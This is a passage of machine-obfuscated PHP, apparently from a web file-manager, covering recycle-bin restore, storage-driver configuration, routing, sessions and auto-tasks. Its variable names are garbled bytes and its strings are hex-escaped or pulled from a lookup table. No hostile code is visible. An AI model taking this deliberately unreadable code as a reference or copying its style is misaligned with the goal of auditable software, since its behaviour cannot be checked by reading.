array($Óø¤¨ÛĞ[586] => $åÒ””Ä [$Óø¤¨ÛĞ[411]], $Óø¤¨ÛĞ[505] => $åÒ””Ä [$Óø¤¨ÛĞ[505]]); $this->where(array($Óø¤¨ÛĞ[402] => $âó»·ø‡))->delete(); } foreach ($Õì©¾ˆî as $¼ÊÏà¤ó) { $¢÷áóš->targetSpaceUpdate($¼ÊÏà¤ó[$Óø¤¨ÛĞ[411]], $¼ÊÏà¤ó[$Óø¤¨ÛĞ[505]]); } } public function restore($’é¬€‚® = false) { $‘€ïº© = $this->listData(); $this->_restoreSource($‘€ïº©, $’é¬€‚®); } public function removeUserAll($†úÔ’¥) { $this->remove(!1, $†úÔ’¥); } private function _restoreSource($¦ï¡ÉÛ, $½Í­ƒ±›) { $ôƒÌîÂ =& $_SERVER[ĞÂ¤àÓï]; $êêéº€¶ = Model($ôƒÌîÂ[1336]); $½Í­ƒ±› = $½Í­ƒ±› == !1 ? !1 : $½Í­ƒ±›; if (!$¦ï¡ÉÛ) { return !0; } $Å™È‰ˆù = array(); foreach ($¦ï¡ÉÛ as $îÑ¾¤¬) { if ($½Í­ƒ±› != !1 && !in_array($îÑ¾¤¬, $½Í­ƒ±›)) { continue; } $·º½ÄÏ´ = $êêéº€¶->sourceInfo($îÑ¾¤¬); $Òµ¼ê¢¢ = $êêéº€¶->sourceInfo($·º½ÄÏ´[$ôƒÌîÂ[432]]); if ($Òµ¼ê¢¢[$ôƒÌîÂ[431]] == $ôƒÌîÂ[88]) { continue; } $êêéº€¶->lockMoveStart($îÑ¾¤¬); $this->recycleMove($îÑ¾¤¬, 0); if ($·º½ÄÏ´[$ôƒÌîÂ[410]] == $ôƒÌîÂ[88]) { $ºá’÷·­ = array($ôƒÌîÂ[590] => array($ôƒÌîÂ[550], $·º½ÄÏ´[$ôƒÌîÂ[521]] . $îÑ¾¤¬ . $ôƒÌîÂ[551])); $êêéº€¶->where($ºá’÷·­)->setField($ôƒÌîÂ[431], 0); $this->restoreFolderChildren($îÑ¾¤¬, $¦ï¡ÉÛ); } $this->where(array($ôƒÌîÂ[402] => $îÑ¾¤¬))->delete(); $êêéº€¶->folderSizeReset($·º½ÄÏ´[$ôƒÌîÂ[432]]); $Å™È‰ˆù[] = $·º½ÄÏ´[$ôƒÌîÂ[432]]; if ($·º½ÄÏ´[$ôƒÌîÂ[410]] == $ôƒÌîÂ[88]) { $Å™È‰ˆù[] = $îÑ¾¤¬; } $êêéº€¶->lockMoveEnd($îÑ¾¤¬); } $êêéº€¶->updateModifyTime($Å™È‰ˆù); } private function restoreFolderChildren($²š«íÉê, $ìª¬åò¬) { $Õó·±ô‘ =& $_SERVER[ĞÂ¤àÓï]; $ŒÖĞáâ» = Model($Õó·±ô‘[1336]); $À˜¿ö = array($Õó·±ô‘[402] => array($Õó·±ô‘[7], array())); foreach ($ìª¬åò¬ as $§•Â÷¸») { if ($§•Â÷¸» == $²š«íÉê) { continue; } if (!$ŒÖĞáâ»->isParentOf($²š«íÉê, $§•Â÷¸»)) { continue; } $Î¥øÂşÖ = $ŒÖĞáâ»->sourceInfo($§•Â÷¸»); if ($Î¥øÂşÖ[$Õó·±ô‘[410]] == $Õó·±ô‘[88]) { $À˜¿ö[] = array($Õó·±ô‘[590] => array($Õó·±ô‘[550], $Î¥øÂşÖ[$Õó·±ô‘[521]] . $§•Â÷¸» . $Õó·±ô‘[551])); } else { $À˜¿ö[$Õó·±ô‘[402]][1][] = $§•Â÷¸»; } } if (!$À˜¿ö[$Õó·±ô‘[402]][1]) { unset($À˜¿ö[$Õó·±ô‘[402]]); } if (!$À˜¿ö) { return; } $À˜¿ö[$Õó·±ô‘[402]][1] = array_unique($À˜¿ö[$Õó·±ô‘[402]][1]); $À˜¿ö[$Õó·±ô‘[1000]] = $Õó·±ô‘[1952]; $ŒÖĞáâ»->where($À˜¿ö)->setField($Õó·±ô‘[431], 1); } private function recycleMove($ÅÜ•™¾ü, $ùÙîëêå = 1) { $Ñ÷¥„ğ¤ =& $_SERVER[ĞÂ¤àÓï]; $Ÿ·Ç‘Û¨ = Model($Ñ÷¥„ğ¤[1336]); $´¬º¡¾ = Model($Ñ÷¥„ğ¤[2163]); $¤­–ì­æ = array($Ñ÷¥„ğ¤[402] => $ÅÜ•™¾ü); if ($ùÙîëêå) { $Ÿ·Ç‘Û¨->where($¤­–ì­æ)->setField($Ñ÷¥„ğ¤[431], 1); $´¬º¡¾->eventRecycle($ÅÜ•™¾ü, $Ñ÷¥„ğ¤[2164]); } else { $Ú£ææøÄ = $Ÿ·Ç‘Û¨->where($¤­–ì­æ)->find(); $§íÁİİ» = $Ú£ææøÄ[$Ñ÷¥„ğ¤[410]] == $Ñ÷¥„ğ¤[88]; $¨Ş¬Ö•õ = $Ÿ·Ç‘Û¨->fileNameAuto($Ú£ææøÄ[$Ñ÷¥„ğ¤[432]], $Ú£ææøÄ[$Ñ÷¥„ğ¤[32]], REPEAT_RENAME_FOLDER, $§íÁİİ»); if ($¨Ş¬Ö•õ != $Ú£ææøÄ[$Ñ÷¥„ğ¤[32]]) { $Ÿ·Ç‘Û¨->rename($ÅÜ•™¾ü, $¨Ş¬Ö•õ); } $Ÿ·Ç‘Û¨->where($¤­–ì­æ)->setField($Ñ÷¥„ğ¤[431], 0); $´¬º¡¾->eventRecycle($ÅÜ•™¾ü, $Ñ÷¥„ğ¤[2165]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x73\157\165\162\143\x65\123\145\x63\x72\145\164\114\151\x73\x74"; public $field = array("\x73\157\165\162\x63\145\x49\x44", "\164\x79\160\x65\x49\104", "\143\x72\145\x61\164\145\x55\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x73\164\x6f\x72\141\x67\145\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x73\x69\x7a\145\115\x61\170", "\x73\171\x73\164\x65\155", "\x64\145\146\141\165\x6c\164", "\144\x72\x69\166\145\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($í£‡·Ç† = false, $«ĞñèÛŠ = "\155\x6f\144\151\146\171\124\x69\155\x65", $ÈïÔçí• = false) { $Äê‰öÊ =& $_SERVER[ĞÂ¤àÓï]; $°£Ÿ¥ÉÌ = parent::listData($í£‡·Ç†, $«ĞñèÛŠ, $ÈïÔçí•); if ($í£‡·Ç†) { return $°£Ÿ¥ÉÌ; } $™çµ±Á = $this->ioSizeUseGet(array_to_keyvalue($°£Ÿ¥ÉÌ, $Äê‰öÊ[12], $Äê‰öÊ[399])); foreach ($°£Ÿ¥ÉÌ as $İéëÊ  => $ğé‡ÉÏ) { unset($°£Ÿ¥ÉÌ[$İéëÊ ][$Äê‰öÊ[6]]); $°£Ÿ¥ÉÌ[$İéëÊ ][$Äê‰öÊ[1843]] = isset($™çµ±Á[$ğé‡ÉÏ[$Äê‰öÊ[399]]]) ? $™çµ±Á[$ğé‡ÉÏ[$Äê‰öÊ[399]]] : 0; } return $°£Ÿ¥ÉÌ; } public function ioSizeUseGet($§È–Øş) { $¬’£éÎè =& $_SERVER[ĞÂ¤àÓï]; if (!$§È–Øş) { return array(); } $óã® Â¤ = $¬’£éÎè[2166] . implode($¬’£éÎè[50], $§È–Øş); $Ùòª•¬” = Cache::get($óã® Â¤); if ($Ùòª•¬”) { return $Ùòª•¬”; } $ææÙäÛ• = array($¬’£éÎè[824] => $¬’£éÎè[399], $¬’£éÎè[2167] => $¬’£éÎè[76]); $©’­¼×ê = array($¬’£éÎè[824] => array($¬’£éÎè[7], $§È–Øş)); $Ùòª•¬” = Model($¬’£éÎè[796])->field($ææÙäÛ•)->where($©’­¼×ê)->group($¬’£éÎè[824])->select(); $Ùòª•¬” = array_to_keyvalue($Ùòª•¬”, $¬’£éÎè[399], $¬’£éÎè[76]); Cache::set($óã® Â¤, $Ùòª•¬”, 600); return $Ùòª•¬”; } public function getConfig($×şîµµ—) { $ôàÑë’„ = parent::listData($×şîµµ—); return json_decode($ôàÑë’„[$_SERVER[ĞÂ¤àÓï][6]], !0); } public function update($‹Ğ­ôç–, $®™ë©Ïé) { $›™Ö°º =& $_SERVER[ĞÂ¤àÓï]; $È­»Ñİ² = $®™ë©Ïé[$›™Ö°º[32]]; $Ãæñ‡—Û = array_to_keyvalue(parent::listData(), $›™Ö°º[32]); if (isset($Ãæñ‡—Û[$È­»Ñİ²]) && $Ãæñ‡—Û[$È­»Ñİ²][$›™Ö°º[399]] != $‹Ğ­ôç–) { return !1; } $this->checkPwd($‹Ğ­ôç–, $®™ë©Ïé); if (isset($®™ë©Ïé[$›™Ö°º[2168]]) && $®™ë©Ïé[$›™Ö°º[2168]] == $›™Ö°º[88]) { $this->checkConfig($®™ë©Ïé); } unset($®™ë©Ïé[$›™Ö°º[2168]]); $Ã×Ïà¬‡ = parent::update($‹Ğ­ôç–, $®™ë©Ïé); if ($Ã×Ïà¬‡ && $®™ë©Ïé[$›™Ö°º[37]]) { $˜’ûİšÁ = 0; foreach ($Ãæñ‡—Û as $ïêáèÁ) { if ($ïêáèÁ[$›™Ö°º[37]] && $ïêáèÁ[$›™Ö°º[399]] != $‹Ğ­ôç–) { $˜’ûİšÁ = $ïêáèÁ[$›™Ö°º[399]]; parent::update($ïêáèÁ[$›™Ö°º[399]], array($›™Ö°º[37] => 0)); } } $this->updateBackup($‹Ğ­ôç–, $˜’ûİšÁ); } return $Ã×Ïà¬‡; } public function add($§µçöĞ) { $¦¤¯öûë =& $_SERVER[ĞÂ¤àÓï]; $ªßÒ»—Ş = array_to_keyvalue(parent::listData(), $¦¤¯öûë[32]); if (isset($ªßÒ»—Ş[$§µçöĞ[$¦¤¯öûë[32]]])) { return !1; } $this->checkConfig($§µçöĞ); $ê¯ÅÓ‰Ø = parent::insert($§µçöĞ); if ($ê¯ÅÓ‰Ø && $§µçöĞ[$¦¤¯öûë[37]]) { foreach ($ªßÒ»—Ş as $ØçÃÃÜŞ) { if ($ØçÃÃÜŞ[$¦¤¯öûë[37]]) { parent::update($ØçÃÃÜŞ[$¦¤¯öûë[399]], array($¦¤¯öûë[37] => 0)); } } } return $ê¯ÅÓ‰Ø; } public function updateBackup($ÔŒÏâ¨„, $ÍŒıˆæñ) { $éäÁ ÙŞ =& $_SERVER[ĞÂ¤àÓï]; if (!$ÍŒıˆæñ) { return; } $èòò¦ûæ = Model($éäÁ ÙŞ[748])->config(); if ($èòò¦ûæ[$éäÁ ÙŞ[1634]] != $éäÁ ÙŞ[88] || $èòò¦ûæ[$éäÁ ÙŞ[751]] != $ÍŒıˆæñ) { return; } $†ôÙö = Model($éäÁ ÙŞ[769])->get($éäÁ ÙŞ[787]); $†ôÙö = json_decode($†ôÙö, !0); if (!$†ôÙö) { return; } $†ôÙö[$éäÁ ÙŞ[751]] = $ÔŒÏâ¨„; Model($éäÁ ÙŞ[769])->set(array($éäÁ ÙŞ[787] => $†ôÙö)); } public function checkPwd($†íê´ûƒ, &$³Ù¡ª¿¨) { $¬ñ¦òäğ =& $_SERVER[ĞÂ¤àÓï]; if (empty($³Ù¡ª¿¨[$¬ñ¦òäğ[6]])) { return; } $ÀíÅšóÖ = json_decode($³Ù¡ª¿¨[$¬ñ¦òäğ[6]], !0); $ıõÃ´˜ = $¬ñ¦òäğ[12]; $û……Õğ = array($¬ñ¦òäğ[2169], $¬ñ¦òäğ[2170], $¬ñ¦òäğ[889]); foreach ($û……Õğ as $ò³Ğƒ¦) { if (isset($ÀíÅšóÖ[$ò³Ğƒ¦])) { $ıõÃ´˜ = $ò³Ğƒ¦; break; } } if (!$ıõÃ´˜) { return; } $›“üÛå€ = $this->getConfig($†íê´ûƒ); $ËÖ£Øâ = $›“üÛå€[$ıõÃ´˜]; $Ì¶„›ìŠ = $ÀíÅšóÖ[$ıõÃ´˜]; if ($Ì¶„›ìŠ == str_repeat($¬ñ¦òäğ[188], strlen($ËÖ£Øâ))) { $ÀíÅšóÖ[$ıõÃ´˜] = $ËÖ£Øâ; $³Ù¡ª¿¨[$¬ñ¦òäğ[6]] = json_encode($ÀíÅšóÖ); } else { if ($Ì¶„›ìŠ != $ËÖ£Øâ) { $³Ù¡ª¿¨[$¬ñ¦òäğ[2168]] = $¬ñ¦òäğ[88]; } } } public function checkConfig(&$ŸªÎğŸŸ, $—äæêµ´ = false) { $å÷››àÍ =& $_SERVER[ĞÂ¤àÓï]; $ÌÜ˜°÷Ò = strtolower($ŸªÎğŸŸ[$å÷››àÍ[95]]); $®­À²àà = json_decode($ŸªÎğŸŸ[$å÷››àÍ[6]], !0); foreach ($®­À²àà as $ÁÎàÇæĞ => $ĞËÚÎµ¢) { $®­À²àà[$ÁÎàÇæĞ] = trim($ĞËÚÎµ¢); } $®­À²àà[$å÷››àÍ[2171]] = rand_string(6); $Öš¶ úŸ = $GLOBALS[$å÷››àÍ[6]][$å÷››àÍ[89]][$å÷››àÍ[833]]; $õ…™‹ù‚ = isset($Öš¶ úŸ[$ÌÜ˜°÷Ò]) ? $Öš¶ úŸ[$ÌÜ˜°÷Ò] : ucfirst($ÌÜ˜°÷Ò); $…ì¨Á‚ = $å÷››àÍ[74] . $õ…™‹ù‚; if (!$õ…™‹ù‚ || !class_exists($…ì¨Á‚)) { if ($—äæêµ´) { return LNG($å÷››àÍ[2172]); } write_log(array($å÷››àÍ[2173], $ŸªÎğŸŸ, get_caller_info()), $å÷››àÍ[2174]); show_json(LNG($å÷››àÍ[2172]), !1, $ŸªÎğŸŸ); } $İ•ÔÓ€ = new $…ì¨Á‚($®­À²àà); if (in_array($ÌÜ˜°÷Ò, $İ•ÔÓ€->objectDriver)) { if (!$İ•ÔÓ€->isBucketCors() && !$İ•ÔÓ€->setBucketCors()) { $Ê™…ôĞ = LNG($å÷››àÍ[2175]); $Ê™…ôĞ .= $å÷››àÍ[2176] . LNG($å÷››àÍ[2177]); if ($—äæêµ´) { return $Ê™…ôĞ; } show_json($Ê™…ôĞ, !1); } } $¨±Ø¾€È = rtrim($®­À²àà[$å÷››àÍ[1181]], $å÷››àÍ[8]) . $å÷››àÍ[8]; $Äº‹ôŒÈ = $İ•ÔÓ€->getPath($¨±Ø¾€È . $å÷››àÍ[1185]); if (!$İ•ÔÓ€->mkfile($Äº‹ôŒÈ)) { if ($—äæêµ´) { return LNG($å÷››àÍ[2175]); } show_json(LNG($å÷››àÍ[2175]), !1); } $®­À²àà[$å÷››àÍ[1181]] = $¨±Ø¾€È; $ŸªÎğŸŸ[$å÷››àÍ[6]] = json_encode($®­À²àà); $ŸªÎğŸŸ[$å÷››àÍ[95]] = $õ…™‹ù‚; return !0; } public function driverListSystem() { $×ÌÈ½ÆÌ =& $_SERVER[ĞÂ¤àÓï]; $èÁç¹Š = parent::listData(); $Ú³ûœ¸Ä = array(); foreach ($èÁç¹Š as $ƒ² ØóŠ) { unset($ƒ² ØóŠ[$×ÌÈ½ÆÌ[200]], $ƒ² ØóŠ[$×ÌÈ½ÆÌ[85]]); $ƒ² ØóŠ[$×ÌÈ½ÆÌ[6]] = json_decode($ƒ² ØóŠ[$×ÌÈ½ÆÌ[6]], !0); $Ú³ûœ¸Ä[] = $ƒ² ØóŠ; } return $Ú³ûœ¸Ä; } public function defaultDriver() { $ŸÎÎúÕÁ =& $_SERVER[ĞÂ¤àÓï]; $ªışÍ¹ = parent::listData(); $ïïı…Ä = array_filter_by_field($ªışÍ¹, $ŸÎÎúÕÁ[37], 1); $ïïı…Ä = $ïïı…Ä[0]; if ($ïïı…Ä) { $ïïı…Ä[$ŸÎÎúÕÁ[6]] = json_decode($ïïı…Ä[$ŸÎÎúÕÁ[6]], !0); } return $ïïı…Ä; } public function driverInfo($é¦Úƒ¼Ê) { $ÓÙø´£ =& $_SERVER[ĞÂ¤àÓï]; $ğ°Ş— = array_to_keyvalue(parent::listData(), $ÓÙø´£[399]); if (!isset($ğ°Ş—[$é¦Úƒ¼Ê])) { return !1; } $´­©„ò = $ğ°Ş—[$é¦Úƒ¼Ê]; $´­©„ò[$ÓÙø´£[6]] = json_decode($´­©„ò[$ÓÙø´£[6]], !0); return $´­©„ò; } public function remove($ÛóªÓ°®) { $this->removeShareItems($ÛóªÓ°®); return parent::remove($ÛóªÓ°®); } public function removeWithFile($İ¢å¦íˆ, $…‚éµÍÊ) { $ïî³Åï =& $_SERVER[ĞÂ¤àÓï]; $§ÎØÍËú = array($ïî³Åï[824] => $İ¢å¦íˆ); $¸¬Š = Model($ïî³Åï[471])->where($§ÎØÍËú)->count(); $©ÏæŞ‰× = Model($ïî³Åï[471])->where($§ÎØÍËú)->sum($ïî³Åï[76]); $×˜‡¾¶ª = $…‚éµÍÊ . $ïî³Åï[2178] . $İ¢å¦íˆ; $Áç»°êõ = LNG($…‚éµÍÊ == $ïî³Åï[557] ? $ïî³Åï[2179] : $ïî³Åï[2180]); $ÏÌ÷áæ‰ = new TaskFileTransfer($×˜‡¾¶ª, $ïî³Åï[2174], $¸¬Š, $Áç»°êõ . "\x28{$İ¢å¦íˆ}\51"); $ÏÌ÷áæ‰->task[$ïî³Åï[762]] = (double) $©ÏæŞ‰×; $±ââù©› = KodIO::defaultDriver(); $›Â×…İ = $±ââù©›[$ïî³Åï[399]]; $»êüüä = "\173\x69\x6f\x3a{$›Â×…İ}\175\x2f"; $Å«×êšÁ = !0; $Åì‘á»‚ = array(); $ùœÈ‹Û£ = Model($ïî³Åï[199])->where($§ÎØÍËú)->field($ïî³Åï[2181])->select(); foreach ($ùœÈ‹Û£ as $˜èÊ»ÄÒ) { $ÉÚ´¼• = $˜èÊ»ÄÒ[$ïî³Åï[84]]; $Å‘ìÛ‚Û = $»êüüä . str_replace("\x7b\x69\x6f\72{$İ¢å¦íˆ}\x7d\57", $ïî³Åï[12], $ÉÚ´¼•); if (!IO::exist($ÉÚ´¼•)) { $Åì‘á»‚[] = $˜èÊ»ÄÒ[$ïî³Åï[468]]; $ÏÌ÷áæ‰->updateFileEnd($˜èÊ»ÄÒ[$ïî³Åï[32]], $˜èÊ»ÄÒ[$ïî³Åï[76]]); continue; } if (IO::exist($Å‘ìÛ‚Û)) { $ÏÌ÷áæ‰->updateFileEnd($˜èÊ»ÄÒ[$ïî³Åï[32]], $˜èÊ»ÄÒ[$ïî³Åï[76]]); continue; } if (!IO::move($ÉÚ´¼•, get_path_father($Å‘ìÛ‚Û))) { $Å«×êšÁ = !1; break; } $§ÎØÍËú = array($ïî³Åï[468] => $˜èÊ»ÄÒ[$ïî³Åï[468]]); $Öİùˆƒ“ = array($ïî³Åï[824] => $›Â×…İ, $ïî³Åï[84] => $Å‘ìÛ‚Û); Model($ïî³Åï[199])->where($§ÎØÍËú)->save($Öİùˆƒ“); } $this->removeByFileID($Åì‘á»‚); if (!$Å«×êšÁ) { $ÏÌ÷áæ‰->stop($×˜‡¾¶ª); return !1; } $ÏÌ÷áæ‰->end(); if ($…‚éµÍÊ == $ïî³Åï[1823]) { $this->remove($İ¢å¦íˆ); } } public function progress($Â‚×™¨Ó, $›¯÷Üµ·) { return Task::get($›¯÷Üµ· . $_SERVER[ĞÂ¤àÓï][2178] . $Â‚×™¨Ó); } private function removeByFileID($ıâ²ù—ì = array()) { $­ÙÉğ® =& $_SERVER[ĞÂ¤àÓï]; if (empty($ıâ²ù—ì)) { return; } $œæ¹Ôûú = array($­ÙÉğ®[468] => array($­ÙÉğ®[7], $ıâ²ù—ì)); $““œ‘ÉÄ = Model($­ÙÉğ®[1336])->where($œæ¹Ôûú)->field($­ÙÉğ®[402])->select(); if (!$““œ‘ÉÄ) { return; } $““œ‘ÉÄ = array_to_keyvalue($““œ‘ÉÄ, $­ÙÉğ®[12], $­ÙÉğ®[402]); foreach ($““œ‘ÉÄ as $Íñªë±Æ) { Model($­ÙÉğ®[416])->removeNow($Íñªë±Æ, !1); } } private function removeShareItems($À±®Ìßı) { $ÎÉùÅ² =& $_SERVER[ĞÂ¤àÓï]; $Šı²ë® = "\173\151\x6f\72{$À±®Ìßı}\175\57"; $“ª¨°•€ = array($ÎÉùÅ²[402] => 0, $ÎÉùÅ²[1176] => array($ÎÉùÅ²[383], "{$Šı²ë®}\x25")); $ô–½‰Ÿ¦ = Model($ÎÉùÅ²[1834])->where($“ª¨°•€)->field($ÎÉùÅ²[489])->select(); if (empty($ô–½‰Ÿ¦)) { return; } $³ôÒ‚öË = array_to_keyvalue($ô–½‰Ÿ¦, $ÎÉùÅ²[12], $ÎÉùÅ²[489]); Model($ÎÉùÅ²[601])->remove($³ôÒ‚öË); } } goto A‹çÈ‹¬º; c©“ÁÕ»: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\133\x5e\x2f\135\x2b", "\x3a\x6e\x75\x6d" => "\x5b\x30\x2d\71\x5d\53", "\72\x61\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($¬÷ÛÛ´û, $Ëû¯¯¿¥) { $ÓñÚ¡¹ç =& $_SERVER[ĞÂ¤àÓï]; if ($¬÷ÛÛ´û == $ÓñÚ¡¹ç[1609]) { $¢€©Ê“Â = array_map($ÓñÚ¡¹ç[1610], $Ëû¯¯¿¥[0]); $±–¯¯Ä• = strpos($Ëû¯¯¿¥[1], $ÓñÚ¡¹ç[8]) === 0 ? $Ëû¯¯¿¥[1] : $ÓñÚ¡¹ç[8] . $Ëû¯¯¿¥[1]; $òôßüÛ† = $Ëû¯¯¿¥[2]; } else { $¢€©Ê“Â = null; $±–¯¯Ä• = strpos($Ëû¯¯¿¥[0], $ÓñÚ¡¹ç[8]) === 0 ? $Ëû¯¯¿¥[0] : $ÓñÚ¡¹ç[8] . $Ëû¯¯¿¥[0]; $òôßüÛ† = $Ëû¯¯¿¥[1]; } array_push(self::$maps, $¢€©Ê“Â); array_push(self::$routes, $±–¯¯Ä•); array_push(self::$methods, strtoupper($¬÷ÛÛ´û)); array_push(self::$callbacks, $òôßüÛ†); } public static function error($¢Ù³Ã³Ğ) { self::$errorCallback = $¢Ù³Ã³Ğ; } public static function haltOnMatch($ÓÀµˆ– = true) { self::$halts = $ÓÀµˆ–; } public static function dispatch() { $îÅŠ¶È =& $_SERVER[ĞÂ¤àÓï]; $Ä´€ñÚù = parse_url($_SERVER[$îÅŠ¶È[1611]], PHP_URL_PATH); $µ¸Ğ‡Š¢ = $_SERVER[$îÅŠ¶È[159]]; $æ³ä–™è = array_keys(static::$patterns); $ÂËŞäÆû = array_values(static::$patterns); $¡Ù©İè = !1; self::$routes = preg_replace($îÅŠ¶È[1277], $îÅŠ¶È[8], self::$routes); if (in_array($Ä´€ñÚù, self::$routes)) { $ñ‰Ûğ¬ö = array_keys(self::$routes, $Ä´€ñÚù); foreach ($ñ‰Ûğ¬ö as $‡ƒ´¨Å¤) { if (self::$methods[$‡ƒ´¨Å¤] == $µ¸Ğ‡Š¢ || self::$methods[$‡ƒ´¨Å¤] == $îÅŠ¶È[1612] || in_array($µ¸Ğ‡Š¢, self::$maps[$‡ƒ´¨Å¤])) { $¡Ù©İè = !0; if (!is_object(self::$callbacks[$‡ƒ´¨Å¤])) { $¢·µÌÎğ = explode($îÅŠ¶È[8], self::$callbacks[$‡ƒ´¨Å¤]); $‡İæ€¾Š = end($¢·µÌÎğ); $í‘Å…÷¢ = explode($îÅŠ¶È[1209], $‡İæ€¾Š); $Ó²Ëş×¯ = new $í‘Å…÷¢[0](); $Ó²Ëş×¯->{$í‘Å…÷¢[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$‡ƒ´¨Å¤]); if (self::$halts) { return; } } } } } else { $ß¤¶Ûµ¸ = 0; foreach (self::$routes as $‡ƒ´¨Å¤) { if (strpos($‡ƒ´¨Å¤, $îÅŠ¶È[4]) !== !1) { $‡ƒ´¨Å¤ = str_replace($æ³ä–™è, $ÂËŞäÆû, $‡ƒ´¨Å¤); } if (preg_match($îÅŠ¶È[1613] . $‡ƒ´¨Å¤ . $îÅŠ¶È[1614], $Ä´€ñÚù, $„íÁâéÀ)) { if (self::$methods[$ß¤¶Ûµ¸] == $µ¸Ğ‡Š¢ || self::$methods[$ß¤¶Ûµ¸] == $îÅŠ¶È[1612] || !empty(self::$maps[$ß¤¶Ûµ¸]) && in_array($µ¸Ğ‡Š¢, self::$maps[$ß¤¶Ûµ¸])) { $¡Ù©İè = !0; array_shift($„íÁâéÀ); if (!is_object(self::$callbacks[$ß¤¶Ûµ¸])) { $¢·µÌÎğ = explode($îÅŠ¶È[8], self::$callbacks[$ß¤¶Ûµ¸]); $‡İæ€¾Š = end($¢·µÌÎğ); $í‘Å…÷¢ = explode($îÅŠ¶È[1209], $‡İæ€¾Š); $Ó²Ëş×¯ = new $í‘Å…÷¢[0](); if (!method_exists($Ó²Ëş×¯, $í‘Å…÷¢[1])) { echo $îÅŠ¶È[1615]; } else { call_user_func_array(array($Ó²Ëş×¯, $í‘Å…÷¢[1]), $„íÁâéÀ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ß¤¶Ûµ¸], $„íÁâéÀ); if (self::$halts) { return; } } } } $ß¤¶Ûµ¸++; } } if ($¡Ù©İè == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $»¥†£á =& $_SERVER[ĞÂ¤àÓï]; header($_SERVER[$»¥†£á[1616]] . $»¥†£á[1617]); echo $»¥†£á[1618]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$îÅŠ¶È[1611]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¿ÈâîËÅ =& $_SERVER[ĞÂ¤àÓï]; static $¥ñ¸¥—† = false; if ($¥ñ¸¥—†) { return $¥ñ¸¥—†; } $ç¥®â¾š = $GLOBALS[$¿ÈâîËÅ[6]][$¿ÈâîËÅ[349]]; self::$sessionTime = $ç¥®â¾š[$¿ÈâîËÅ[1619]]; $ôŞª¯¦Ó = isset($GLOBALS[$¿ÈâîËÅ[1620]]) ? $GLOBALS[$¿ÈâîËÅ[1620]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ôŞª¯¦Ó)) { self::$sessionSign = Cookie::get($ôŞª¯¦Ó); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ôŞª¯¦Ó, self::$sessionSign, self::$sessionTime); $˜››ğ = $ç¥®â¾š[$¿ÈâîËÅ[1621]]; $ªÖ¬Ãáì = $ç¥®â¾š[$˜››ğ]; $£¸®²’Ï = $ç¥®â¾š[$¿ÈâîËÅ[835]]; switch ($˜››ğ) { case $¿ÈâîËÅ[21]: self::$handle = Model($¿ÈâîËÅ[836]); break; case $¿ÈâîËÅ[837]: self::$handle = new CacheRedis($ªÖ¬Ãáì, $£¸®²’Ï); break; case $¿ÈâîËÅ[838]: self::$handle = new CacheMemcached($ªÖ¬Ãáì, $£¸®²’Ï); break; case $¿ÈâîËÅ[199]: $ªÖ¬Ãáì[$¿ÈâîËÅ[84]] = $ªÖ¬Ãáì[$¿ÈâîËÅ[84]] . $¿ÈâîËÅ[1622]; self::$handle = new CacheFile($ªÖ¬Ãáì, $£¸®²’Ï); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¥ñ¸¥—† = new self(); return $¥ñ¸¥—†; } public static function getBySign($Š—­ƒ¿Ÿ) { CacheLock::lock($Š—­ƒ¿Ÿ); $İ¥Æ¬ïÆ = self::$handle->get($Š—­ƒ¿Ÿ); CacheLock::unlock($Š—­ƒ¿Ÿ); $İ¥Æ¬ïÆ = unserialize($İ¥Æ¬ïÆ); return is_array($İ¥Æ¬ïÆ) ? $İ¥Æ¬ïÆ : array(); } public static function setBySign($¥ºüœæî, $ŸÜëÇ×¹) { CacheLock::lock($¥ºüœæî); self::$handle->set($¥ºüœæî, serialize($ŸÜëÇ×¹), self::$sessionTime); CacheLock::unlock($¥ºüœæî); } public static function sign($ô»ËßÅÉ = false) { $ô»ËßÅÉ && (self::$sessionSign = $ô»ËßÅÉ); self::init(); return self::$sessionSign; } public static function set($Î€‘Å°—, $®™œıÑ± = false) { self::init(); if (is_array($Î€‘Å°—)) { foreach ($Î€‘Å°— as $ÒÙ´×–œ => $¶›ƒá’) { array_set_value(self::$data, $ÒÙ´×–œ, $¶›ƒá’); } } else { array_set_value(self::$data, $Î€‘Å°—, $®™œıÑ±); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ñ¾«¯õ = false) { self::init(); if (!$ñ¾«¯õ) { return self::$data; } return array_get_value(self::$data, $ñ¾«¯õ); } public static function remove($Şõ¦ÃïÂ) { self::init(); unset(self::$data[$Şõ¦ÃïÂ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ĞÂ¤àÓï][840])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $É¼Ûá”¢ =& $_SERVER[ĞÂ¤àÓï]; if (self::valueGet($É¼Ûá”¢[749]) != $É¼Ûá”¢[88]) { return; } if (self::valueGet($É¼Ûá”¢[1623]) == $É¼Ûá”¢[88]) { $ˆø¢ßÀÈ = self::valueGet($É¼Ûá”¢[1624]); if (time() - $ˆø¢ßÀÈ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$É¼Ûá”¢[1625]] = 1; self::valueSet($É¼Ûá”¢[1623], $É¼Ûá”¢[88]); self::log($É¼Ûá”¢[1626] . ACTION . 